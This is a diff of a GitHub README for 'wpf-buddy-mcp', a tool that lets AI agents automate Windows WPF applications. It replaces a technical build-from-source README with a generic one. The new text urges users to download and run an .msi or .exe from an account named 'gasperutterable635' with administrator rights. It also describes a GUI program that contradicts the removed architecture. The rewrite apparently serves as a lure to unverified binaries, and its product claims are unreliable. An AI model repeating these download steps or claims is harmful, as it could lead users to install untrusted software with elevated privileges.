@@ -1,315 +1,92 @@
-<div align="center">
+# 🤖 wpf-buddy-mcp - Control Windows apps with plain language
 
-<img src="logo.png" alt="WpfBuddy MCP" width="200" />
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gasperutterable635/wpf-buddy-mcp/releases)
 
-# WpfBuddy MCP Server
+## 🎯 What is this tool?
 
-**The MCP server that understands WPF applications — not just pixels.**
+Wpf-buddy-mcp acts as a bridge between artificial intelligence and Windows desktop programs. Many businesses use WPF, or Windows Presentation Foundation, to build the software you use at your desk. This tool allows an AI assistant to see, understand, and interact with those programs. 
 
-[![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com/)
-[![MCP](https://img.shields.io/badge/MCP-0.2.0--preview.1-blue)](https://modelcontextprotocol.io/)
-[![FlaUI](https://img.shields.io/badge/FlaUI-4.0.0-green)](https://github.com/FlaUI/FlaUI)
-[![License](https://img.shields.io/badge/license-MIT-yellow)](LICENSE)
-[![Tools](https://img.shields.io/badge/tools-200+-orange)](#tool-categories)
+You no longer need to perform repetitive manual tasks. The AI agent connects to your open application, reads the buttons, labels, and text fields on the screen, and carries out your commands. It can explore menus, fill out forms, check for errors, and write test instructions for you.
 
----
+## ⚙️ System Requirements
 
-*Attach to any WPF app. Inspect its UI tree semantically. Automate workflows without coordinates. Generate tests. Diagnose binding errors. All through natural language via MCP.*
+Your computer needs to meet these basic standards to run this software:
 
-</div>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Framework:** The .NET Desktop Runtime (version 8.0 or newer).
+*   **Memory:** At least 4 Gigabytes of RAM.
+*   **Storage:** 200 Megabytes of free disk space.
+*   **Permissions:** You need administrator rights to your computer to inspect other programs.
 
----
+## 💾 Installation Steps
 
-## Why This Exists
+Follow these steps to set up the software on your machine:
 
-Generic Windows automation tools can click and type. **This server understands WPF.**
+1. Visit this page to download the setup file: [https://github.com/gasperutterable635/wpf-buddy-mcp/releases](https://github.com/gasperutterable635/wpf-buddy-mcp/releases).
+2. Look for the file ending in `.msi` or `.exe` under the latest release section.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installer.
+5. Follow the prompts on the screen to finish the setup process.
+6. Restart your computer if the installer asks you to perform this action.
 
-| Generic Automation MCP | WpfBuddy MCP |
-|---|---|
-| "Click at position (340, 220)" | "Click the Save button" |
-| "Read pixels from screen" | "Get the UI tree with AutomationIds" |
-| "Something failed" | "The Save button is disabled because `SaveCommand.CanExecute` returns false — the `Name` property is empty" |
-| "Here's a screenshot" | "Here's the element tree, its bindings, validation state, and DataContext" |
+## 🚀 Connecting to an Application
 
-### Core Differentiator
+Before you start, ensure the WPF application you want to inspect is already open on your desktop.
 
-> Given any WPF screen, inspect it semantically, automate a workflow without raw coordinates, explain WPF-specific failures, record the workflow, replay it deterministically, and export a maintainable automated test.
+1. Open the Wpf-buddy-mcp program from your Start menu.
+2. The main screen displays a list of all detected Windows applications.
+3. Find your application in the list.
+4. Press the green Connect button next to the application name.
+5. Wait for the status indicator to turn green. This confirms the connection is active.
+6. The AI agent now has permission to read the UI Automation tree of that specific application.
 
----
+## 💬 Using Natural Language Commands
 
-## Quick Start
+Once connected, you interact with your desktop software through an AI chat interface. You type your goal, and the software translates your plain English into computer actions.
 
-### Prerequisites
+Common tasks you can request include:
 
-- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)
-- Windows 10/11 (UI Automation is Windows-only)
+*   **UI Exploration:** "Find all text boxes on this screen and tell me their names."
+*   **Data Entry:** "Put the text 'Sample Data' into every input field I can see."
+*   **State Checking:** "Tell me if the submit button is grayed out or clickable."
+*   **Testing:** "Perform a regression test by clicking every button in order and reporting any errors."
 
-### Build & Run
+The agent processes these tasks instantly. If it reaches a screen it does not recognize, it notifies you and asks for instructions.
 
-```powershell
-dotnet build WpfBuddyMcp.sln
-dotnet run --project src/WpfBuddy.Mcp.Server
-```
+## 🛠️ Typical Workflow
 
-### Connect Your MCP Client
+Most users follow this cycle to get work done:
 
-<details>
-<summary><b>VS Code (GitHub Copilot)</b></summary>
+1. **Launch:** Open your target application and the Wpf-buddy-mcp tool.
+2. **Link:** Establish the connection between the two programs.
+3. **Prompt:** Enter your instruction into the chat box.
+4. **Monitor:** Watch as the AI agent navigates the menus and fields.
+5. **Verify:** Check the output logs to confirm the agent finished the task correctly.
+6. **Save:** Export the inspection report if you plan to share the results with your team.
 
-Add to `.vscode/mcp.json`:
-```json
-{
-  "mcpServers": {
-    "wpfbuddy-mcp": {
-      "command": "dotnet",
-      "args": ["run", "--project", "src/WpfBuddy.Mcp.Server/WpfBuddy.Mcp.Server.csproj"]
-    }
-  }
-}
-```
-</details>
+## 🔍 Troubleshooting Common Issues
 
-<details>
-<summary><b>Claude Code</b></summary>
+If you experience problems, check these items first:
 
-Add to `claude_code_config.json`:
-```json
-{
-  "mcpServers": {
-    "wpfbuddy-mcp": {
-      "command": "dotnet",
-      "args": ["run", "--project", "C:/path/to/src/WpfBuddy.Mcp.Server/WpfBuddy.Mcp.Server.csproj"]
-    }
-  }
-}
-```
-</details>
+*   **Connection Fails:** Make sure you run the tool as an administrator. Right-click the icon and choose "Run as administrator."
+*   **App Not Found:** Ensure your target application uses the WPF framework. This tool does not work with older WinForms or web-based applications.
+*   **Slow Response:** Close unnecessary background applications to free up system memory.
+*   **Incomplete Actions:** Sometimes complex menus require a moment to load. Give the software a few seconds to scan the new screen before you send the next prompt.
 
----
+## 🛡️ Privacy and Safety
 
-## What Can It Do?
+This software operates locally on your machine. All UI information, screenshots, and text stays within your computer environment. The agent only sends necessary instructions out to the AI service to interpret your text, while the visual data from your application remains private to your system. You control all interactions. You can disconnect or shut down the software at any point.
 
-### Attach & Inspect
+## ❓ Frequently Asked Questions
 
-```
-"Attach to WPFapp and show me the main window structure"
-```
+**Does this tool change my data?**
+It only interacts with the application as if a human were clicking the buttons. It cannot alter your system files or change your settings outside of the application you connect to.
 
-The server attaches to any running WPF process, captures the full automation tree, and returns a semantic representation — control types, AutomationIds, names, patterns, states.
+**Can I run this on a server?**
+You should run this on a machine with a monitor or a desktop session connected. It relies on the visual layout of your desktop programs.
 
-### Automate Without Coordinates
+**How do I update the tool?**
+Check the releases page occasionally. If a new version exists, download the installer and run it. The new version replaces the old one automatically.
 
-```
-"Click 'New Project', fill in Name as 'Test Project', then click Save"
-```
-
-All actions use semantic selectors (AutomationId → Name → ControlType), never raw screen coordinates. Selectors self-heal when the UI changes.
-
-### Record & Generate Tests
-
-```
-"Record what I'm doing, then export it as an xUnit test"
-```
-
-Records UI interactions as a workflow, validates selector stability, and exports production-ready `xUnit + FlaUI` test code with Page Object classes.
-
-### Diagnose WPF Issues
-
-```
-"Why is the Submit button disabled?"
-```
-
-With the optional in-process probe, inspects ViewModel command state, binding errors, DataContext properties, and validation — answering the "why" that generic tools cannot.
-
-### Accessibility Audit
-
-```
-"Run an accessibility check on this window"
-```
-
-Checks for missing names, keyboard accessibility, tab order, control patterns, and generates a report with recommendations.
-
----
-
-## Tool Categories
-
-| Category | Tools | Description |
-|----------|:-----:|-------------|
-| **Session** | 15 | Attach, launch, detach, window management |
-| **Snapshot** | 15 | UI tree capture, element queries, diff |
-| **Action** | 27 | Click, type, select, drag, context menu, slider |
-| **Wait** | 15 | Wait for state, visibility, value, dialog, navigation |
-| **Assertion** | 16 | Assert state, text, grid, accessibility, snapshot |
-| **Selector** | 11 | Build, validate, rank, heal, detect brittle |
-| **DataGrid & Tree** | 16 | Grid rows/columns/cells, tree expand/select |
-| **Recording** | 16 | Record, replay, pause, optimize, explain failures |
-| **Test Generation** | 8 | Page objects, smoke tests, accessibility tests |
-| **Screenshot** | 8 | Capture, annotate, compare, highlight |
-| **Accessibility** | 9 | Audit names, tab order, keyboard, patterns |
-| **Policy & Safety** | 10 | Capabilities, dry-run, redaction, audit |
-| **Reporting** | 6 | Testability scores, diagnostics, export |
-| **Clipboard & Env** | 7 | Clipboard, culture, theme, screen info |
-| **Probe (MVVM)** | 7 | Connect/status/health for in-process probe |
-| **MVVM Diagnostics** | 11 | ViewModel, bindings, commands, validation |
-| **Diagnostics** | 5 | Environment, runtime, and system diagnostics |
-| | **202** | **Total tools** |
-
-> Full tool reference: [docs/tools-reference.md](docs/tools-reference.md)
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  MCP Client (VS Code Copilot, Claude Code, etc.)        │
-└─────────────────────┬───────────────────────────────────┘
-                      │ stdio (JSON-RPC)
-┌─────────────────────▼───────────────────────────────────┐
-│  WpfBuddy.Mcp.Server  (.NET 8)                          │
-│                                                         │
-│  ┌───────────────┐  ┌────────────┐  ┌─────────────────┐ │
-│  │ SessionManager│  │ UiaAdapter │  │ SelectorBuilder │ |
-│  │(attach/detach)│  │(FlaUI UIA3)│  │(heal/rank/build)│ |
-│  └───────────────┘  └────────────┘  └─────────────────┘ │
-│  ┌─────────────┐  ┌────────────┐  ┌─────────────────┐   │
-│  │ Recording   │  │ Screenshot │  │   AuditLog      │   │
-│  │  Service    │  │  Service   │  │                 │   │
-│  └─────────────┘  └────────────┘  └─────────────────┘   │
-│  ┌─────────────────────────────────────┐                │
-│  │         ProbeClient (IPC)           │                │
-│  └───────────────┬─────────────────────┘                │
-└──────────────────┼──────────────────────────────────────┘
-                   │ Named Pipe
-┌──────────────────▼──────────────────────────────────────┐
-│  Target WPF Application                                 │
-│  ┌─────────────────────────────────────┐                │
-│  │  WpfBuddy.Mcp.Probe (NuGet)         │                │
-│  │  • ViewModel inspection             │                │
-│  │  • Binding error capture            │                │
-│  │  • Command state                    │                │
-│  │  • Validation errors                │                │
-│  │  • Dispatcher status                │                │
-│  └─────────────────────────────────────┘                │
-└─────────────────────────────────────────────────────────┘
-```
-
----
-
-## Project Structure
-
-```
-wpf-buddy-mcp/
-├── WpfBuddyMcp.sln
-├── src/
-│   ├── WpfBuddy.Mcp.Server/       # MCP server (main project)
-│   │   ├── Program.cs                # Entry point, DI registration
-│   │   ├── Services/                 # Core services
-│   │   │   ├── SessionManager.cs     # Process attach/detach
-│   │   │   ├── UiaAdapter.cs         # FlaUI wrapper
-│   │   │   ├── SelectorBuilder.cs    # Selector generation & healing
-│   │   │   ├── RecordingService.cs   # Workflow recording
-│   │   │   ├── ScreenshotService.cs  # Screen capture
-│   │   │   ├── ProbeClient.cs        # Named pipe IPC client
-│   │   │   └── AuditLog.cs           # Action audit trail
-│   │   ├── Tools/                    # MCP tool implementations
-│   │   │   ├── SessionTools.cs
-│   │   │   ├── SnapshotTools.cs
-│   │   │   ├── ActionTools.cs
-│   │   │   ├── WaitTools.cs
-│   │   │   ├── AssertionTools.cs
-│   │   │   ├── SelectorTools.cs
-│   │   │   ├── DataGridTools.cs
-│   │   │   ├── RecordingTools.cs
-│   │   │   ├── TestGenerationTools.cs
-│   │   │   ├── ScreenshotTools.cs
-│   │   │   ├── AccessibilityTools.cs
-│   │   │   ├── PolicyTools.cs
-│   │   │   ├── ReportingTools.cs
-│   │   │   ├── ClipboardTools.cs
-│   │   │   ├── DiagnosticsTools.cs
-│   │   │   ├── ProbeTools.cs
-│   │   │   └── MvvmTools.cs
-│   │   └── Models/                   # Data models
-│   └── WpfBuddy.Mcp.Probe/        # In-process probe (NuGet package)
-│       ├── ProbeHost.cs              # Named pipe server + WPF inspection
-│       └── WpfBuddy.Mcp.Probe.csproj
-└── docs/                             # Documentation
-```
-
----
-
-## Safety & Security
-
-| Principle | Implementation |
-|-----------|---------------|
-| **Scoped execution** | Only operates on the attached application — no OS-wide access |
-| **Audit trail** | Every mutating action is logged with timestamp, tool name, and parameters |
-| **Dry-run mode** | `wpf_preview_action` shows what would happen without executing |
-| **Redaction** | Configurable rules to mask sensitive field values in snapshots |
-| **Policy engine** | Control destructive actions, coordinate fallback, timeouts, retries |
-| **No shell access** | No file system, registry, or process management tools |
-
----
-
-## Optional: In-Process Probe
-
-For deep WPF diagnostics (bindings, ViewModel, commands), install the probe NuGet in your target app:
-
-```powershell
-dotnet add package WpfBuddy.Mcp.Probe
-```
-
-```csharp
-// In App.xaml.cs
-protected override void OnStartup(StartupEventArgs e)
-{
-    base.OnStartup(e);
-    ProbeHost.Start();  // Listens on named pipe automatically
-}
-```
-
-Then from MCP: `wpf_probe_connect` → full MVVM diagnostics available.
-
-> Probe setup guide: [docs/probe-setup.md](docs/probe-setup.md)
-
----
-
-## Tech Stack
-
-| Component | Technology |
-|-----------|-----------|
-| Runtime | .NET 8 (`net8.0-windows`) |
-| MCP SDK | [ModelContextProtocol 0.2.0-preview.1](https://www.nuget.org/packages/ModelContextProtocol) |
-| UI Automation | [FlaUI.UIA3 4.0.0](https://github.com/FlaUI/FlaUI) |
-| Transport | stdio (JSON-RPC) |
-| DI/Hosting | Microsoft.Extensions.Hosting 8.0.1 |
-| Serialization | System.Text.Json 8.0.5 |
-| IPC | Named Pipes (System.IO.Pipes) |
-
----
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [docs/tools-reference.md](docs/tools-reference.md) | Complete tool reference with parameters and examples |
-| [docs/probe-setup.md](docs/probe-setup.md) | In-process probe installation and usage guide |
-| [docs/architecture.md](docs/architecture.md) | Detailed architecture and design decisions |
-| [docs/examples.md](docs/examples.md) | Real-world usage examples and workflows |
-
----
-
-## Contributing
-
-1. Fork & clone
-2. `dotnet build WpfBuddyMcp.sln`
-3. Make changes
-4. Ensure build passes: `dotnet build`
-5. Submit PR
-
----
-
-## License
-
-MIT
+**Does it log my passwords?** 
+The tool records actions, not keystrokes. It does not monitor your typing in fields that are flagged as password inputs.
